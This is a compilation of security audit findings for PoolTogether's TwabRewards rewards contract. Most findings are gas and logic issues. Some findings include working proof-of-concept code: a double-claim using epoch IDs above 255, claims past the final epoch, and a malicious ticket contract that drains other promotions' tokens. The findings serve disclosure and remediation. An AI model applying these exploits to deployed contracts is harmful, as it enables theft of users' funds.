# Handle  0x0x0x   # Vulnerability details  [https://github.com/pooltogether/v4-periphery/blob/b520faea26bcf60371012f6cb246aa149abd3c7d/contracts/TwabRewards.sol#L302-L321](https://github.com/pooltogether/v4-periphery/blob/b520faea26bcf60371012f6cb246aa149abd3c7d/contracts/TwabRewards.sol#L302-L321) is as follows:  ```         uint256 _averageBalance = _ticket.getAverageBalanceBetween(             _user,             uint64(_epochStartTimestamp),             uint64(_epochEndTimestamp)         );          uint64[] memory _epochStartTimestamps = new uint64[](1);         _epochStartTimestamps[0] = uint64(_epochStartTimestamp);          uint64[] memory _epochEndTimestamps = new uint64[](1);         _epochEndTimestamps[0] = uint64(_epochEndTimestamp);          uint256[] memory _averageTotalSupplies = _ticket.getAverageTotalSuppliesBetween(             _epochStartTimestamps,             _epochEndTimestamps         );          if (_averageTotalSupplies[0] > 0) {             return (_promotion.tokensPerEpoch * _averageBalance) / _averageTotalSupplies[0];         }          return 0;     } ```  Since `_averageBalance` is always bigger than `_averageTotalSupplies[0]`. We can implement the, if statement earlier. This will ensure to output 0 earlier. Furthermore, `_averageBalance` is in stack and this check costs less gas. Therefore, the code can be implemented as follows:  ```         uint256 _averageBalance = _ticket.getAverageBalanceBetween(             _user,             uint64(_epochStartTimestamp),             uint64(_epochEndTimestamp)         );     if (_averageBalance > 0) {           uint64[] memory _epochStartTimestamps = new uint64[](1);           _epochStartTimestamps[0] = uint64(_epochStartTimestamp);              uint64[] memory _epochEndTimestamps = new uint64[](1);           _epochEndTimestamps[0] = uint64(_epochEndTimestamp);              uint256[] memory _averageTotalSupplies = _ticket.getAverageTotalSuppliesBetween(               _epochStartTimestamps,               _epochEndTimestamps           );              return (_promotion.tokensPerEpoch * _averageBalance) / _averageTotalSupplies[0];         }          return 0;     } ```  
# Handle  hubble   # Vulnerability details  ## Impact Since there is an option for the promoter to provide an alternate address while issuing cancelPromotion apart from the creator(promoter address) It is good to track the _to address where the remainingRewards are sent on cancelPromotion  ## Proof of Concept contract : TwabRewards line 50 :    event PromotionCancelled(uint256 indexed promotionId, uint256 amount);  function : cancelPromotion(uint256 _promotionId, address _to) line 135 :  emit PromotionCancelled(_promotionId, _remainingRewards);  ## Tools Used Manual review  ## Recommended Mitigation Steps Add the 'to address' in the event, as below  line 50 :    event PromotionCancelled(uint256 indexed promotionId, address to, uint256 amount);  function : cancelPromotion(uint256 _promotionId, address _to) line 135 :  emit PromotionCancelled(_promotionId, _to, _remainingRewards);    
# Handle  WatchPug   # Vulnerability details  For the arithmetic operations that will never over/underflow, using the unchecked directive (Solidity v0.8 has default overflow/underflow checks) can save some gas from the unnecessary internal over/underflow checks.  For example:  https://github.com/pooltogether/v4-periphery/blob/0e94c54774a6fce29daf9cb23353208f80de63eb/contracts/TwabRewards.sol#L153-L153  ```solidity=153 uint256 _amount = _numberOfEpochs * _promotion.tokensPerEpoch; ```  `_numberOfEpochs` is uint8 `_promotion.tokensPerEpoch` is uint216  `_numberOfEpochs * _promotion.tokensPerEpoch` will never overflow.  
# Handle  WatchPug   # Vulnerability details  For ended promotions, `getCurrentEpochId()` may return a `epochId` larger than `numberOfEpochs`.  If the result of this view method is to be used as parameters of `claimRewards()`, it may cause `claimRewards()` to fail.  https://github.com/pooltogether/v4-periphery/blob/0e94c54774a6fce29daf9cb23353208f80de63eb/contracts/TwabRewards.sol#L276-L279  ```solidity=276 function _getCurrentEpochId(Promotion memory _promotion) internal view returns (uint256) {     // elapsedTimestamp / epochDurationTimestamp     return (block.timestamp - _promotion.startTimestamp) / _promotion.epochDuration; } ```  ### Recommendation  Consider checking if `block.timestamp > _promotionEndTimestamp` in `_getCurrentEpochId()` and return `_promotion.numberOfEpochs - 1` for ended promotions.  
# Handle  WatchPug   # Vulnerability details  For unstarted promotions, `cancelPromotion()` will revert at `block.timestamp - _promotion.startTimestamp` in `_getCurrentEpochId()`.  Call stack: `cancelPromotion()` -> `_getRemainingRewards()` -> `_getCurrentEpochId()`.  https://github.com/pooltogether/v4-periphery/blob/0e94c54774a6fce29daf9cb23353208f80de63eb/contracts/TwabRewards.sol#L331-L336  ```solidity=331 function _getRemainingRewards(Promotion memory _promotion) internal view returns (uint256) {     // _tokensPerEpoch * _numberOfEpochsLeft     return         _promotion.tokensPerEpoch *         (_promotion.numberOfEpochs - _getCurrentEpochId(_promotion)); } ```  https://github.com/pooltogether/v4-periphery/blob/0e94c54774a6fce29daf9cb23353208f80de63eb/contracts/TwabRewards.sol#L276-L279  ```solidity=276 function _getCurrentEpochId(Promotion memory _promotion) internal view returns (uint256) {     // elapsedTimestamp / epochDurationTimestamp     return (block.timestamp - _promotion.startTimestamp) / _promotion.epochDuration; } ```  ### Recommendation  Consider checking if ` _promotion.startTimestamp > block.timestamp` and refund `_promotion.tokensPerEpoch * _promotion.numberOfEpochs` in `cancelPromotion()`.  
# Handle  WatchPug   # Vulnerability details  https://github.com/pooltogether/v4-periphery/blob/0e94c54774a6fce29daf9cb23353208f80de63eb/contracts/TwabRewards.sol#L308-L323  ```solidity=308{314,319,320} uint64[] memory _epochStartTimestamps = new uint64[](1); _epochStartTimestamps[0] = uint64(_epochStartTimestamp);  uint64[] memory _epochEndTimestamps = new uint64[](1); _epochEndTimestamps[0] = uint64(_epochEndTimestamp);  uint256[] memory _averageTotalSupplies = _ticket.getAverageTotalSuppliesBetween(     _epochStartTimestamps,     _epochEndTimestamps );  if (_averageTotalSupplies[0] > 0) {     return (_promotion.tokensPerEpoch * _averageBalance) / _averageTotalSupplies[0]; }  return 0; ```  As there is only one time frame, `uint256[] memory _averageTotalSupplies = getAverageTotalSuppliesBetween(...)` can be changed to `uint256 _averageTotalSupply = getAverageTotalSuppliesBetween(...)[0]`, and `_averageTotalSupplies[0]` can be changed to `_averageTotalSupply` for gas saving.  
# Handle  WatchPug   # Vulnerability details  https://github.com/pooltogether/v4-periphery/blob/0e94c54774a6fce29daf9cb23353208f80de63eb/contracts/TwabRewards.sol#L230-L244  ```solidity=230{233,237-243}     function _requireTicket(address _ticket) internal view {         require(_ticket != address(0), "TwabRewards/ticket-not-zero-address");          (bool succeeded, bytes memory data) = address(_ticket).staticcall(             abi.encodePacked(ITicket(_ticket).controller.selector)         );          address controllerAddress;          if (data.length > 0) {             controllerAddress = abi.decode(data, (address));         }          require(succeeded && controllerAddress != address(0), "TwabRewards/invalid-ticket");     } ```  ### Recommendation  Change to:  ```solidity=230{233,237}     function _requireTicket(address _ticket) internal view {         require(_ticket != address(0), "TwabRewards/ticket-not-zero-address");          (bool succeeded, bytes memory data) = _ticket.staticcall(             abi.encodePacked(ITicket(_ticket).controller.selector)         );          require(succeeded && data.length > 0 && abi.decode(data, (uint160)) != 0, "TwabRewards/invalid-ticket");     } ```  -   Removing redundant casting of `address(_ticket)` as `_ticket` is `address`; -   `controllerAddress` is unnecessary as it's being used only once; -   Checking if `succeeded` earlier can avoid unnecessary code execution when this check failed; -   Replacing `abi.decode(data, (address)) != address(0)` with `abi.decode(data, (uint160)) != 0` to avoid type casting.  
# Handle  certora   # Vulnerability details  getRewardsAmount gets epochs ids as uint256[]. However, it should be uint8[].  In _calculateRewardAmount, the epoch start time and end time are calculated: ``` uint256 _epochStartTimestamp = _promotion.startTimestamp + (_epochDuration * _epochId); uint256 _epochEndTimestamp = _epochStartTimestamp + _epochDuration; ```  and then are casted to uint64 for the rest of the function. if it's greater than 2**64, it will be truncated. ## Impact `getRewardsAmount` might return wrong result  ## Tools Used manual review ## Recommended Mitigation Steps get _epochIds as uint8[] instead uint256[]  
# Handle  GiveMeTestEther   # Vulnerability details  ## Impact cancelPromotion() and its modifier both call _getPromotion() to get the Promotion struct. We can save one such call by removing the modifier and do the check of the modifier at the beginning of the cancelPromotion() block to save storage reads.   ## Proof of Concept https://github.com/pooltogether/v4-periphery/blob/b520faea26bcf60371012f6cb246aa149abd3c7d/contracts/TwabRewards.sol#L119  ## Tools Used  ## Recommended Mitigation Steps - remove the modifier onlyPromotionCreator - do the require statement at the beginning of cancelPromotion()       function cancelPromotion(uint256 _promotionId, address _to)         external         override         returns (bool)     {         Promotion memory _promotion = _getPromotion(_promotionId);                // do here the modifiers check          require(             msg.sender == _promotion .creator,             "TwabRewards/only-promotion-creator"         );          _requirePromotionActive(_promotion);         require(_to != address(0), "TwabRewards/recipient-not-zero-address");          uint256 _remainingRewards = _getRemainingRewards(_promotion);          delete _promotions[_promotionId];         _promotion.token.safeTransfer(_to, _remainingRewards);          emit PromotionCancelled(_promotionId, _remainingRewards);          return true;     }  
# Handle  leastwood   # Vulnerability details  ## Impact  Users who have a small claim on rewards for various promotions, may not feasibly be able to claim these rewards as gas costs could outweigh the sum they receive in return. Hence, it is likely that a dust balance accrues overtime for tokens allocated for various promotions. Additionally, the `_calculateRewardAmount` calculation may result in truncated results, leading to further accrual of a dust balance. Therefore, it is useful that these funds do not go to waste.  ## Proof of Concept  https://github.com/pooltogether/v4-periphery/blob/b520faea26bcf60371012f6cb246aa149abd3c7d/contracts/TwabRewards.sol#L162-L191  ## Tools Used  Manual code review.  ## Recommended Mitigation Steps  Consider allowing an `admin` account to skim a promotion's tokens if it has been inactive for a certain length of time. There are several potential implementations, in varying degrees of complexity. However, the solution should attempt to maximise simplicity while minimising the accrual of dust balances.  
# Handle  sirhashalot   # Vulnerability details  ## Impact  The `_calculateRewardAmount()` function in TwabRewards.sol uses the uint256 type for the three variables `_epochDuration`, `_epochStartTimestamp`, and `_epochEndTimestamp`. However, there is no need for these variable to be uint256 instead of uint64 because 1. these variables are later cast as uint64 values anyway 2. the block.timestamp value is orders of magnitude less than the uint64 max value. To expand on this second point, if the the block.timestamp values were on the same order of magnitude as the uint64 max value, then the casting of the uint256 timestamp values to uint64 could cause overflow issues because the OpenZeppelin SafeCast library is not used.  The timestamp values could even be of type uint32 (Uniswap v3 does this in places, and the max uint32 timestamp equates to the year 2106), but since the ITicket.sol contract imported by TwabRewards.sol uses uint64, it would be better to use uint64 to maintain consistency.  ## Proof of Concept  The uint256 variables that can be uint64 are found in TwabRewards.sol: https://github.com/pooltogether/v4-periphery/blob/b520faea26bcf60371012f6cb246aa149abd3c7d/contracts/TwabRewards.sol#L294-L296   ## Tools Used  Manual analysis  ## Recommended Mitigation Steps  Make these variables uint64 for gas savings and consistency with Iticket.sol timestamps. Remove unnecessary uint64() casting when all variables in the `_calculateRewardAmount()` function consistently use uint64 types.  
# Handle  harleythedog   # Vulnerability details  ## Impact The implementation of `_getCurrentEpochId` is: ``` function  _getCurrentEpochId(Promotion  memory  _promotion) internal  view  returns (uint256) {  return (block.timestamp - _promotion.startTimestamp) / _promotion.epochDuration; } ```  This means that if exactly `_promotion.epochDuration` seconds have elapsed since the start timestamp, then  the current epoch is 1, and the 0th epoch is completed. However, there are the following lines of code in `_calculateRewardAmount`:  ``` function  _calculateRewardAmount(  address  _user,  Promotion  memory  _promotion,  uint256  _epochId ) internal  view  returns (uint256) {  uint256 _epochDuration = _promotion.epochDuration;  uint256 _epochStartTimestamp = _promotion.startTimestamp + (_epochDuration * _epochId);  uint256 _epochEndTimestamp = _epochStartTimestamp + _epochDuration;  require(block.timestamp > _epochEndTimestamp, "TwabRewards/epoch-not-over");  ... } ```  If exactly `_promotion.epochDuration` seconds have elapsed since the start timestamp, then this function will revert since the require has a `>` instead of a `>=`.  Thus there are two conflicting definitions of when an epoch ends. In the case of `_getCurrentEpochId`, it is when `_promotion.epochDuration` seconds elapse. In the case of `_calculateRewardAmount`, it is when *more than* `_calculateRewardAmount` seconds elapse. This only makes a difference in one exact second, but it is best to be consistent.  ## Proof of Concept See `_getCurrentEpochId` here: https://github.com/pooltogether/v4-periphery/blob/b520faea26bcf60371012f6cb246aa149abd3c7d/contracts/TwabRewards.sol#L276  See `_calculateRewardAmount` here: https://github.com/pooltogether/v4-periphery/blob/b520faea26bcf60371012f6cb246aa149abd3c7d/contracts/TwabRewards.sol#L289  ## Tools Used Inspection  ## Recommended Mitigation Steps Change  ``` require(block.timestamp > _epochEndTimestamp, "TwabRewards/epoch-not-over"); ``` to  ``` require(block.timestamp >= _epochEndTimestamp, "TwabRewards/epoch-not-over"); ``` in `_calculateRewardAmount`.  
# Handle  harleythedog   # Vulnerability details  ## Impact In ITwabRewards.sol, it is claimed that `getRewardsAmount` should account for epochs that have already been claimed, and not include these epochs in the total amount (indeed, there is a line that says `@dev Will be 0 if user has already claimed rewards for the epoch.`)  However, no such check is done in the implementation of `getRewardsAmount`. This means that users will be shown rewardAmounts that are higher than they should be, and users will be confused when they are transferred fewer tokens than they are told they will. This would cause confusion, and people may begin to mistrust the contract since they think they are being transferred fewer tokens than they are owed.  ## Proof of Concept See the implementation of `getRewardsAmount` here: https://github.com/pooltogether/v4-periphery/blob/b520faea26bcf60371012f6cb246aa149abd3c7d/contracts/TwabRewards.sol#L209  Notice that there are no checks that the epochs have not already been claimed. Compare this to `claimRewards` which *does* check for epochs that have already been claimed with the following require statement: ``` require(!_isClaimedEpoch(_userClaimedEpochs, _epochId), "TwabRewards/rewards-already-claimed"); ``` A similar check should be added `getRewardsAmount` so that previously claimed epochs are not included in the sum.  ## Tools Used Inspection  ## Recommended Mitigation Steps Add a similar check for previously claimed epochs as described above.  
# Handle  Meta0xNull   # Vulnerability details  ## Impact <code>require(_to != address(0), "TwabRewards/recipient-not-zero-address");</code>  Check Zero Address Before Function Call eg. _requirePromotionActive() Can Save Gas.  ## Proof of Concept https://github.com/pooltogether/v4-periphery/blob/b520faea26bcf60371012f6cb246aa149abd3c7d/contracts/TwabRewards.sol#L128  ## Tools Used Manual Review  ## Recommended Mitigation Steps Move Zero Address Check to Line L125: https://github.com/pooltogether/v4-periphery/blob/b520faea26bcf60371012f6cb246aa149abd3c7d/contracts/TwabRewards.sol#L125  
# Handle  pmerkleplant   # Vulnerability details  ## Impact  There exist ERC20 tokens that charge a fee for every transfer.  This kind of token does not work correctly with the `TwabRewards` contract as the rewards calculation for an user is based on `promotion.tokensPerEpoch` (see line [320](https://github.com/pooltogether/v4-periphery/blob/b520faea26bcf60371012f6cb246aa149abd3c7d/contracts/TwabRewards.sol#L320)).  However, the actual amount of tokens the contract holds could be less than `promotion.tokensPerEpoch * promotion.numberOfEpochs` leading to not claimable rewards for users claiming later than others.  ## Recommended Mitigation Steps  To disable fee-on transfer tokens for the contract, add the following code in `createPromotion` around line 11: ``` uint256 oldBalance = _token.balanceOf(address(this)); _token.safeTransferFrom(msg.sender, address(this), _tokensPerEpoch * _numberOfEpochs); uint256 newBalance = _token.balanceOf(address(this)); require(oldBalance + _tokenPerEpoch * _numberOfEpochs == newBalance); ```  
# Handle  kenzo   # Vulnerability details  User supplied values are not checked and can lead to unexpected behavior (such as division by 0, underflows...)  ## Impact I believe the high risk impact has been detailed and mitigated in other findings. However, for cleanliness and preventive measures, I suggest not allowing illogical inputs.  ## Proof of Concept There is no validation on the user supplied promotion inputs. [(Code ref)](https://github.com/pooltogether/v4-periphery/blob/b520faea26bcf60371012f6cb246aa149abd3c7d/contracts/TwabRewards.sol#L88:#L116) Therefore for example, a user can supply _numberOfEpochs = 0, _epochDuration = 0, _tokensPerEpoch = 0. This leads to garbage values in the contract. A user can create a promotion without paying any tokens (if _numberOfEpochs or _tokensPerEpoch  = 0). These may confuse front ends, or compound to lead to more serious errors.  ## Recommended Mitigation Steps Add sanity checks (such as inputs > 0) to `createPromotion` and `extendPromotion`.  
# Handle  gpersoon   # Vulnerability details  ## Impact When you cancel a promotion with cancelPromotion() then the promotion is complete deleted. This means no-one can claim any rewards anymore, because  _promotions[_promotionId] no longer exists.  It also means all the unclaimed tokens (of the previous epochs) will stay locked in the contract.  ## Proof of Concept https://github.com/pooltogether/v4-periphery/blob/b520faea26bcf60371012f6cb246aa149abd3c7d/contracts/TwabRewards.sol#L119-L138 ```JS function cancelPromotion(uint256 _promotionId, address _to) ... {        ...         uint256 _remainingRewards = _getRemainingRewards(_promotion);         delete _promotions[_promotionId];         ```  ## Tools Used  ## Recommended Mitigation Steps In the function cancelPromotion() lower the numberOfEpochs or set a state variable, to allow user to claim their rewards.  
# Handle  gpersoon   # Vulnerability details  ## Impact When claiming rewards via claimRewards(), the function _calculateRewardAmount() is called. The function _calculateRewardAmount() has a check to make sure the epoch is over  ```JS   require(block.timestamp > _epochEndTimestamp, "TwabRewards/epoch-not-over");  ``` However neither functions check if the _epochId is within the range of the reward epochs. Ergo it is possible to continue claiming rewards after the reward period is over. This only works as long as there are enough tokens in the contract. But this is the case when not everyone has claimed, or other rewards use the same token.  The proof of concept contains a simplified version of the contract, and shows how this can be done. When run in remix you get the following output, while there is only 1 epoch. console.log:  Claiming for epoch 1 1  Claiming for epoch 2 1  Claiming for epoch 3 1  Claiming for epoch 4 1  Claiming for epoch 5 1  ## Proof of Concept ```JS  // SPDX-License-Identifier: GPL-3.0 pragma solidity 0.8.6; import "hardhat/console.sol";    contract TwabRewards {      struct Promotion {         uint216 tokensPerEpoch;         uint32 startTimestamp;         uint32 epochDuration;         uint8 numberOfEpochs;     }     mapping(uint256 => Promotion) internal _promotions;     uint256 internal _latestPromotionId;     mapping(uint256 => mapping(address => uint256)) internal _claimedEpochs;          constructor() {         uint id=createPromotion(1,uint32(block.timestamp)-10,1,1);         claimRewards(id,1);         claimRewards(id,2);         claimRewards(id,3);         claimRewards(id,4);         claimRewards(id,5);     }           function createPromotion(uint216 _tokensPerEpoch,uint32 _startTimestamp,uint32 _epochDuration,uint8 _numberOfEpochs) public  returns (uint256) {         uint256 _nextPromotionId = _latestPromotionId + 1;         _latestPromotionId = _nextPromotionId;         _promotions[_nextPromotionId] = Promotion(_tokensPerEpoch,_startTimestamp,_epochDuration,_numberOfEpochs);         return _nextPromotionId;     }       function claimRewards(         uint256 _promotionId,         uint256 _epochId     ) public  returns (uint256) {         Promotion memory _promotion = _getPromotion(_promotionId);         address _user=address(0);         uint256 _rewardsAmount;         uint256 _userClaimedEpochs = _claimedEpochs[_promotionId][_user];          for (uint256 index = 0; index < 1; index++) {             require(                 !_isClaimedEpoch(_userClaimedEpochs, _epochId),                 "TwabRewards/rewards-already-claimed"             );             _rewardsAmount += _calculateRewardAmount(_promotion, _epochId);             _userClaimedEpochs = _updateClaimedEpoch(_userClaimedEpochs, _epochId);         }         _claimedEpochs[_promotionId][_user] = _userClaimedEpochs;         console.log("Claiming for epoch",_epochId,_rewardsAmount);         return _rewardsAmount;     }      function getPromotion(uint256 _promotionId) public view  returns (Promotion memory) {         return _getPromotion(_promotionId);     }   function _getPromotion(uint256 _promotionId) internal view returns (Promotion memory) {         return _promotions[_promotionId];     }          function _isClaimedEpoch(uint256 _userClaimedEpochs, uint256 _epochId) internal pure returns (bool)     {         return (_userClaimedEpochs >> _epochId) & uint256(1) == 1;     }   function _calculateRewardAmount(                 Promotion memory _promotion,         uint256 _epochId     ) internal view returns (uint256) {         uint256 _epochDuration = _promotion.epochDuration;         uint256 _epochStartTimestamp = _promotion.startTimestamp + (_epochDuration * _epochId);         uint256 _epochEndTimestamp = _epochStartTimestamp + _epochDuration;         require(block.timestamp > _epochEndTimestamp, "TwabRewards/epoch-not-over");         return 1;     }   function _updateClaimedEpoch(uint256 _userClaimedEpochs, uint256 _epochId) internal pure returns (uint256) {         return _userClaimedEpochs | (uint256(1) << _epochId);     }        function _getCurrentEpochId(Promotion memory _promotion) internal view returns (uint256) {                 return (block.timestamp - _promotion.startTimestamp) / _promotion.epochDuration;     }       function _getRemainingRewards(Promotion memory _promotion) internal view returns (uint256) {         // _tokensPerEpoch * _numberOfEpochsLeft         return             _promotion.tokensPerEpoch *             (_promotion.numberOfEpochs - _getCurrentEpochId(_promotion));     }   } ```  ## Tools Used  ## Recommended Mitigation Steps In the function _calculateRewardAmount() add something like the following in the beginning after the require. if ( _epochId >= _promotion.numberOfEpochs) return 0;   
# Handle  gpersoon   # Vulnerability details  ## Impact The function _requirePromotionActive() contains the following check in a require statement: ```JS  _promotionEndTimestamp > 0 && _promotionEndTimestamp >= block.timestamp, ``` When _promotionEndTimestamp is larger than block.timestamp it will also be larger than 0. Thus the statement can be simplified to save some gas.  ## Proof of Concept https://github.com/pooltogether/v4-periphery/blob/b520faea26bcf60371012f6cb246aa149abd3c7d/contracts/TwabRewards.sol#L250-L258  ```JS function _requirePromotionActive(Promotion memory _promotion) internal view {         ...         require(  _promotionEndTimestamp > 0 && _promotionEndTimestamp >= block.timestamp, "TwabRewards/promotion-not-active" );     } ```   ## Tools Used  ## Recommended Mitigation Steps Change the require statement to:         require( _promotionEndTimestamp >= block.timestamp, "TwabRewards/promotion-not-active" ); // will certainly be > 0  
# Handle  robee   # Vulnerability details  Caching the array length is more gas efficient.  This is because access to a local variable in solidity is more efficient than query storage / calldata / memory  We recommend to change from:  for (uint256 i=0; i<array.length; i++) { ... } to: uint len = array.length   for (uint256 i=0; i<len; i++) { ... } These functions use not using prefix increments (`++x`) or not using the unchecked keyword:           TwabRewards.sol, _epochIds, 172         TwabRewards.sol, _epochIds, 217   
# Handle  robee   # Vulnerability details  The following require messages are of length more than 32 and we think are short enough to short them into exactly 32 characters such that it will be placed in one slot of memory and the require  function will cost less gas.  The list:           Solidity file: TwabRewards.sol, In line 128, Require message length to shorten: 38, The message: TwabRewards/recipient-not-zero-address         Solidity file: TwabRewards.sol, In line 175, Require message length to shorten: 35, The message: TwabRewards/rewards-already-claimed         Solidity file: TwabRewards.sol, In line 231, Require message length to shorten: 35, The message: TwabRewards/ticket-not-zero-address   
# Handle  robee   # Vulnerability details  In ITwabRewards.sol, Promotion is optimized to: 4 slots from: 5 slots. The new order of types (you choose the actual variables):         1. IERC20         2. uint216         3. uint32         4. uint8         5. address         6. uint32         7. address   
# Handle  csanuragjain   # Vulnerability details  ## Impact This can lead to loss of funds as there is no recovery function of funds stuck like this  ## Proof of Concept 1. User A creates a new promotion using createPromotion function. By mistake he provides 1 year ago value for _startTimestamp with promotion duration as 6 months  2. Since there is no check to see that _startTimestamp > block.timestamp so this promotion gets created  3. User cannot claim this promotion if they were not having promotion tokens in the 1 year old promotion period. This means promotion amount remains with contract  4. Even promotion creator cannot claim back his tokens since promotion end date has already passed so cancelPromotion will fail  5. As there is no recovery token function in contract so even contract cant transfer this token and the tokens will remain in this contract with no one able to claim those   ## Recommended Mitigation Steps Add below check in the createPromotion function  ``` function createPromotion(         address _ticket,         IERC20 _token,         uint216 _tokensPerEpoch,         uint32 _startTimestamp,         uint32 _epochDuration,         uint8 _numberOfEpochs     ) external override returns (uint256) { require(_startTimestamp>block.timestamp,"should be after current time"); } ```  
# Handle  johnnycash   # Vulnerability details  ## Impact  An attacker can claim its reward 256 * `epochDuration` seconds after the timestamp at which the promotion started. The vulnerability allows him to claim a reward several times to retrieve all the tokens associated to the promotion.    ## Analysis  `claimRewards()` claim rewards for a given promotion and epoch. In order to prevent a user from claiming a reward multiple times, the mapping [_claimedEpochs](https://github.com/pooltogether/v4-periphery/blob/ceadb25844f95f19f33cb856222e461ed8edf005/contracts/TwabRewards.sol#L32) keeps track of claimed rewards per user:  ```     /// @notice Keeps track of claimed rewards per user.     /// @dev _claimedEpochs[promotionId][user] => claimedEpochs     /// @dev We pack epochs claimed by a user into a uint256. So we can't store more than 255 epochs.     mapping(uint256 => mapping(address => uint256)) internal _claimedEpochs; ```  (The comment is wrong, epochs are packed into a uint256 which allows **256** epochs to be stored).  `_epochIds` is an array of `uint256`. For each `_epochId` in this array, `claimRewards()` checks that the reward associated to this `_epochId` isn't already claimed thanks to  `_isClaimedEpoch()`. [_isClaimedEpoch()](https://github.com/pooltogether/v4-periphery/blob/ceadb25844f95f19f33cb856222e461ed8edf005/contracts/TwabRewards.sol#L371) checks that the bit `_epochId` of `_claimedEpochs` is unset:  ``` (_userClaimedEpochs >> _epochId) & uint256(1) == 1; ```  However, if `_epochId` is greater than 255, `_isClaimedEpoch()` always returns false. It allows an attacker to claim a reward several times.  [_calculateRewardAmount()](https://github.com/pooltogether/v4-periphery/blob/ceadb25844f95f19f33cb856222e461ed8edf005/contracts/TwabRewards.sol#L289) just makes use of `_epochId` to tell whether the promotion is over.   ## Proof of Concept  The following test should result in a reverted transaction, however the transaction succeeds.  ```         it('should fail to claim rewards if one or more epochs have already been claimed', async () => {             const promotionId = 1;              const wallet2Amount = toWei('750');             const wallet3Amount = toWei('250');              await ticket.mint(wallet2.address, wallet2Amount);             await ticket.mint(wallet3.address, wallet3Amount);              await createPromotion(ticket.address);             await increaseTime(epochDuration * 257);              await expect(                 twabRewards.claimRewards(wallet2.address, promotionId, ['256', '256']),             ).to.be.revertedWith('TwabRewards/rewards-already-claimed');         }); ```   ## Tools Used  Text editor.   ## Recommended Mitigation Steps  A possible fix could be to change the type of `_epochId` to `uint8` in:  - `_calculateRewardAmount()` - `_updateClaimedEpoch()` - `_isClaimedEpoch()`  and change the type of `_epochIds` to `uint8[]` in `claimRewards()`.  
# Handle  johnnycash   # Vulnerability details  ## Impact  `_getPromotion()` doesn't revert if the specified `_promotionId` doesn't exist. It can lead to unexpected behaviors in callers of this function.  For instance, [claimRewards](https://github.com/pooltogether/v4-periphery/blob/ceadb25844f95f19f33cb856222e461ed8edf005/contracts/TwabRewards.sol#L162) will continue its execution and call `_calculateRewardAmount()` and eventually `_promotion.token.safeTransfer()` (probably with `_rewardsAmount` equal to 0).   ## Analysis  In contrary to the following comment:  ``` @dev Will revert if the promotion does not exist. ```  [_getPromotion()](https://github.com/pooltogether/v4-periphery/blob/ceadb25844f95f19f33cb856222e461ed8edf005/contracts/TwabRewards.sol#L260-L268) doesn't revert if the specified `_promotionId` doesn't exist, but return a `Promotion` structure with all fields set to 0.   ## Tools Used  Text editor.   ## Recommended Mitigation Steps  Fix suggestion:  ```     function _getPromotion(uint256 _promotionId) internal view returns (Promotion memory _promotion) {         _promotion = _promotions[_promotionId];         require(_promotion.creator != address(0), "TwabRewards/invalid-promotion");         return _promotion;     } ```  
# Handle  johnnycash   # Vulnerability details  ## Impact  It allows an attacker to retrieve all the tokens of each promotions.   ## Analysis  Anyone can create a new promotion using `createPromotion()`. An attacker can create a new malicious promotion with the following parameters:  - the address of a malicious ticket smart contract - the token address from the targeted promotion(s) - optionally, `_numberOfEpochs` equal to 0 to create this promotion for free  The only verification made on the ticket address given by [_requireTicket()](https://github.com/pooltogether/v4-periphery/blob/master/contracts/TwabRewards.sol#L230-L244) is that the smart contract must implement the `ITicket` interface.  The attacker can then call `claimRewards()` with its wallet address, the malicious promotion id and a single _epochId for the sake of clarity.  1. `_calculateRewardAmount()` is first called to get the reward amount with the following formula `(_promotion.tokensPerEpoch * _ticket.getAverageBalanceBetween()) / _ticket.getAverageTotalSuppliesBetween()`. The malicious ticket can return an arbitrary  `_averageBalance` and an `_averageTotalSupplies` of 1, leading to an arbitrary large reward amount. 2. `_promotion.token.safeTransfer(_user, _rewardsAmount)` is called. It transfers the amount of tokens previously computed to the attacker.  The attacker receives the tokens of other promotions without having spent anything.   ## Proof of Concept  The malicious smart contract is a copy/paste of [TicketHarness.sol](https://github.com/pooltogether/v4-core/blob/master/contracts/test/TicketHarness.sol) and [Ticket.sol](https://github.com/pooltogether/v4-core/blob/master/contracts/Ticket.sol)with the following changes:  ```     /// @inheritdoc ITicket     function getAverageTotalSuppliesBetween(         uint64[] calldata _startTimes,         uint64[] calldata _endTimes     ) external view override returns (uint256[] memory) {         uint256[] memory _balances = new uint256[](1);         _balances[0] = uint256(1);         return _balances;     }      /// @inheritdoc ITicket     function getAverageBalanceBetween(         address _user,         uint64 _startTime,         uint64 _endTime     ) external view override returns (uint256) {         return 1337;     } ```  The test for HardHat is:  ```     describe('exploit()', async () => {         it('this shouldnt happen', async () => {             const promotionIdOne = 1;             const promotionIdTwo = 2;              await expect(createPromotion(ticket.address))                 .to.emit(twabRewards, 'PromotionCreated')                 .withArgs(promotionIdOne);                          let evilTicketFactory = await getContractFactory('EvilTicket');             let evilTicket = await evilTicketFactory.deploy('EvilTicket', 'TICK', 18, wallet1.address);             let createPromotionTimestamp = (await ethers.provider.getBlock('latest')).timestamp;             await expect(twabRewards.connect(wallet2).createPromotion(                 evilTicket.address,                 rewardToken.address,                 tokensPerEpoch,                 createPromotionTimestamp,                 1,//epochDuration,                 0,//epochsNumber,             )).to.emit(twabRewards, 'PromotionCreated')               .withArgs(promotionIdTwo);              await increaseTime(100);             const epochIds = ['100'];             await twabRewards.connect(wallet2).claimRewards(wallet2.address, promotionIdTwo, epochIds);         });     }); ```  It results in the following error:  ```  1) TwabRewards        exploit()          this shouldnt happen:      Error: VM Exception while processing transaction: reverted with reason string 'ERC20: transfer amount exceeds balance'       at TwabRewardsHarness.verifyCallResult (@openzeppelin/contracts/utils/Address.sol:209)       at TwabRewardsHarness.functionCallWithValue (@openzeppelin/contracts/utils/Address.sol:132)       at TwabRewardsHarness.functionCall (@openzeppelin/contracts/utils/Address.sol:94)       at TwabRewardsHarness._callOptionalReturn (@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol:92)       at TwabRewardsHarness.safeTransfer (@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol:25)       at TwabRewardsHarness.claimRewards (contracts/TwabRewards.sol:186) ```   ## Tools Used  Text editor.   ## Recommended Mitigation Steps  Maybe add a whitelist of trusted tickets?  
